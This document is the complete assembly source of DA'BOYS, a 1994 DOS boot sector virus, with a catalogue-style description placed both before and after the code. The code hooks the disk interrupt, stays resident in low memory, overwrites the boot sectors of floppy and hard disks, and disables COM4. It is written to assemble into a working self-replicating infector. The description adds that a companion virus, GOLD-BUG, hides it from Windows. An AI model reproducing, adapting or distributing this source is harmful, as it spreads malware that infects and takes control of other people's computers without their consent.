comment #
Virus Name:  DA'BOYS
Aliases:     DALLAS COWBOYS
V Status:    New, Research
Discovery:   January, 1994
Symptoms:    Possible diskette access problems; BSC; Infected disks fail to
         boot on 8088 or 8086 processors; No COM4.
Origin:      USA
Eff Length:  251 Bytes
Type Code:   BORaX - Resident Overwriting Boot Sector and Master Boot Sector
         Infector
Detection Method:  None
Removal Instructions:  DOS SYS

General Comments:

    The DA'BOYS virus will only work with DOS 5 or DOS 6+ with an 80186 or
    better processor.  Unlike other boot sector infectors, the DA'BOYS
    virus overwrites or rewrites the DOS boot sector.  It does not make a
    copy or move the boot sector to another sector.  It will infect all
    American DOS 5 or DOS 6 boot sectors.  It will infect disks in drive
    A: or B:  It works with 360K, 720K, 1.2M, 1.44M or 2.88M disks.

    When a disk is booted with the DA'BOYS virus, it will load itself into
    a "hole" in lower DOS memory.  CHKDSK will not show a decrease in
    available memory.  INT 12 will not be moved.  The DA'BOYS virus code
    is written in the "Non-System disk or disk error  Replace and press
    any key when ready" string.  But it will display the above message by
    using the code found on the hard disk DOS boot sector.  It will then
    infect the DOS boot sector (not the partition table) of the hard disk
    and overwrite the "Non-System ... " text string with it's code.

    The DA'BOYS virus does not damage any data.  It disables COM4.  The
    text string "DA'BOYS" appears in the virus code but is not displayed.

    The DA'BOYS virus has a companion virus that it works with.  The
    GOLD-BUG virus is also a boot sector infector.  It is possible to have
    a diskette with two boot sector viruses.  GOLD-BUG hides the presence
    of the DA'BOYS virus from the Windows 3.1 startup routine.  GOLD-BUG
    removes the DA'BOYS virus from the INT 13 chain at the start of
    Windows and restores it when Windows ends.

    It can be removed from diskettes and hard disks with the DOS SYS
    command.

#
cseg            segment para    public  'code'
da_boys         proc    near
assume          cs:cseg

;-----------------------------------------------------------------------------

;designed by "Q" the misanthrope.

;-----------------------------------------------------------------------------

.186
TRUE            equ     001h
FALSE           equ     000h

;-----------------------------------------------------------------------------

;option                              bytes used

COM4_OFF        equ     TRUE    ;  3 bytes
DA_BOYS_TEXT    equ     TRUE    ;  6 bytes

;-----------------------------------------------------------------------------

ADDR_MUL        equ     004h
BIOS_INT_13     equ     0c6h
BOOT_INT        equ     019h
BOOT_OFFSET     equ     07c00h
COM4_OFFSET     equ     00406h
COM_OFFSET      equ     00100h
DISK_INT        equ     013h
DOS_GET_INT     equ     03500h
DOS_INT         equ     021h
DOS_SET_INT     equ     02500h
FIRST_SECTOR    equ     00001h
INITIAL_BX      equ     00078h
LOW_CODE        equ     0021dh
NEW_INT_13_LOOP equ     0cdh
READ_A_SECTOR   equ     00201h
RETURN_NEAR     equ     0c3h
SECTOR_SIZE     equ     00200h
TERMINATE_W_ERR equ     04c00h
TWO_BYTES       equ     002h
VIRGIN_INT_13_B equ     007b4h
WRITE_A_SECTOR  equ     00301h

;-----------------------------------------------------------------------------

io_seg          segment at 00070h
        org     00000h
io_sys_loads_at label   word
io_seg          ends

;-----------------------------------------------------------------------------

bios_seg        segment at 0f000h
        org     09315h
original_int_13 label   word
bios_seg        ends

;-----------------------------------------------------------------------------

        org     COM_OFFSET
com_code:

;-----------------------------------------------------------------------------

dropper         proc    near
        xor     ax,ax
        mov     ds,ax
        lds     dx,dword ptr ds:[VIRGIN_INT_13_B]
        mov     ax,DOS_SET_INT+BIOS_INT_13
        int     DOS_INT
        mov     dx,offset interrupt_13+LOW_CODE-offset old_jz
        xor     ax,ax
        mov     ds,ax
        mov     ax,DOS_SET_INT+DISK_INT
        int     DOS_INT
        mov     di,LOW_CODE
        mov     si,offset old_jz
        push    ds
        pop     es
        call    move_to_boot
        mov     ax,READ_A_SECTOR
        mov     cx,FIRST_SECTOR
        mov     dx,00180h
        mov     bx,offset buffer
        push    cs
        pop     es
        int     DISK_INT
already_set:    mov     ax,TERMINATE_W_ERR
        int     DOS_INT
dropper         endp


;-----------------------------------------------------------------------------

        org     00048h+COM_OFFSET
        call    initialize

;-----------------------------------------------------------------------------

        org     000ebh+COM_OFFSET
old_jz:         jz      old_code

;-----------------------------------------------------------------------------

        org     00edh+COM_OFFSET

;-----------------------------------------------------------------------------

error:          jmp     error_will_jmp+LOW_CODE-000ebh-BOOT_OFFSET
move_to_low:    mov     si,offset old_jz+BOOT_OFFSET-COM_OFFSET
        xor     ax,ax
move_to_boot:   mov     cx,offset jmp_old_int_13-offset old_jz+1
        pushf
        cld
        rep     movs byte ptr es:[di],cs:[si]
        popf
        ret

;-----------------------------------------------------------------------------

old_code:       mov     ax,word ptr ds:[bx+01ah]
        dec     ax
        dec     ax
        mov     di,BOOT_OFFSET+049h
        mov     bl,byte ptr ds:[di-03ch]
        xor     bh,bh
        mul     bx
        add     ax,word ptr ds:[di]
        adc     dx,word ptr ds:[di+002h]
        mov     bx,00700h
        mov     cl,003h
old_loop:       pusha
        call    more_old_code
        popa
        jc      error
        add     ax,0001h
        adc     dx,00h
        add     bx,word ptr ds:[di-03eh]
        loop    old_loop
        mov     ch,byte ptr ds:[di-034h]
        mov     dl,byte ptr ds:[di-025h]
        mov     bx,word ptr ds:[di]
        mov     ax,word ptr ds:[di+002h]
        jmp     far ptr io_sys_loads_at

;-----------------------------------------------------------------------------

initialize:     mov     bx,INITIAL_BX
        mov     di,LOW_CODE
        push    ss
        pop     ds
        jmp     short set_interrupts

;-----------------------------------------------------------------------------

error_will_jmp: mov     bx,BOOT_OFFSET
        IF      DA_BOYS_TEXT
        db      'DA',027h,'BOYS'
        ELSE
        push    bx
        ENDIF
        mov     ax,00100h
        mov     dx,08000h
load_from_disk: mov     cx,ax
        mov     ax,READ_A_SECTOR
        xchg    ch,cl
        xchg    dh,dl
        int     DISK_INT
        ret

;-----------------------------------------------------------------------------

        org     00160h+COM_OFFSET

;-----------------------------------------------------------------------------

more_old_code:  mov     si,BOOT_OFFSET+018h
        cmp     dx,word ptr ds:[si]
        jnb     stc_return
        div     word ptr ds:[si]
        inc     dl
        mov     ch,dl
        xor     dx,dx
        IF      COM4_OFF
        mov     word ptr ds:[COM4_OFFSET],dx
        ENDIF
        div     word ptr ds:[si+002h]
        mov     dh,byte ptr ds:[si+00ch]
        shl     ah,006h
        or      ah,ch
        jmp     short load_from_disk
stc_return:     stc
        ret

;-----------------------------------------------------------------------------

        org     0181h+COM_OFFSET
        ret

;-----------------------------------------------------------------------------

restart_it:     int     BOOT_INT

;-----------------------------------------------------------------------------

set_interrupts: cmp     word ptr ds:[di],ax
        jne     is_resident
        mov     word ptr ds:[NEW_INT_13_LOOP*ADDR_MUL+TWO_BYTES],ax
        xchg    word ptr ds:[bx+(DISK_INT*ADDR_MUL+TWO_BYTES)-INITIAL_BX],ax
        mov     word ptr ds:[BIOS_INT_13*ADDR_MUL+TWO_BYTES],ax
        mov     ax,offset interrupt_13+LOW_CODE-offset old_jz
        mov     word ptr ds:[NEW_INT_13_LOOP*ADDR_MUL],ax
        xchg    word ptr ds:[bx+(DISK_INT*ADDR_MUL)-INITIAL_BX],ax
        mov     word ptr ds:[BIOS_INT_13*ADDR_MUL],ax
is_resident:    jmp     move_to_low

;-----------------------------------------------------------------------------

interrupt_13    proc    far
        cmp     ah,high(READ_A_SECTOR)
        jne     jmp_old_int_13
        cmp     cx,FIRST_SECTOR
        jne     jmp_old_int_13
        cmp     dh,cl
        ja      jmp_old_int_13
        pusha
        int     BIOS_INT_13
        jc      not_boot_sect
        mov     ax,0efe8h
        xchg    word ptr es:[bx+048h],ax
        cmp     ax,078bbh
        jne     not_boot_sect
        mov     di,bx
        add     di,offset old_jz-COM_OFFSET
        cmp     bh,high(BOOT_OFFSET)
        pushf
        jne     no_key_press
        mov     byte ptr es:[di+00ch],RETURN_NEAR
        pusha
        call    near ptr hit_any_key
        popa
no_key_press:   mov     ax,WRITE_A_SECTOR
        mov     si,LOW_CODE
        call    move_to_boot
        inc     cx
        int     BIOS_INT_13
        popf
        je      restart_it
not_boot_sect:  popa
interrupt_13    endp

;-----------------------------------------------------------------------------

        org     001e5h+COM_OFFSET
jmp_old_int_13: jmp     far ptr original_int_13

;-----------------------------------------------------------------------------

buffer          db      SECTOR_SIZE dup (0)

;-----------------------------------------------------------------------------

        org     07cedh-LOW_CODE+offset old_jz
hit_any_key     label   word

;-----------------------------------------------------------------------------

da_boys         endp
cseg            ends
end             com_code

;-----------------------------------------------------------------------------

Virus Name:  DA'BOYS
Aliases:     DALLAS COWBOYS
V Status:    New, Research
Discovery:   January, 1994
Symptoms:    Possible diskette access problems; BSC; Infected disks fail to
         boot on 8088 or 8086 processors; No COM4.
Origin:      USA
Eff Length:  251 Bytes
Type Code:   BORaX - Resident Overwriting Boot Sector and Master Boot Sector
         Infector
Detection Method:  None
Removal Instructions:  DOS SYS

General Comments:

    The DA'BOYS virus will only work with DOS 5 or DOS 6+ with an 80186 or
    better processor.  Unlike other boot sector infectors, the DA'BOYS
    virus overwrites or rewrites the DOS boot sector.  It does not make a
    copy or move the boot sector to another sector.  It will infect all
    American DOS 5 or DOS 6 boot sectors.  It will infect disks in drive
    A: or B:  It works with 360K, 720K, 1.2M, 1.44M or 2.88M disks.

    When a disk is booted with the DA'BOYS virus, it will load itself into
    a "hole" in lower DOS memory.  CHKDSK will not show a decrease in
    available memory.  INT 12 will not be moved.  The DA'BOYS virus code
    is written in the "Non-System disk or disk error  Replace and press
    any key when ready" string.  But it will display the above message by
    using the code found on the hard disk DOS boot sector.  It will then
    infect the DOS boot sector (not the partition table) of the hard disk
    and overwrite the "Non-System ... " text string with it's code.

    The DA'BOYS virus does not damage any data.  It disables COM4.  The
    text string "DA'BOYS" appears in the virus code but is not displayed.

    The DA'BOYS virus has a companion virus that it works with.  The
    GOLD-BUG virus is also a boot sector infector.  It is possible to have
    a diskette with two boot sector viruses.  GOLD-BUG hides the presence
    of the DA'BOYS virus from the Windows 3.1 startup routine.  GOLD-BUG
    removes the DA'BOYS virus from the INT 13 chain at the start of
    Windows and restores it when Windows ends.

    It can be removed from diskettes and hard disks with the DOS SYS
    command.
    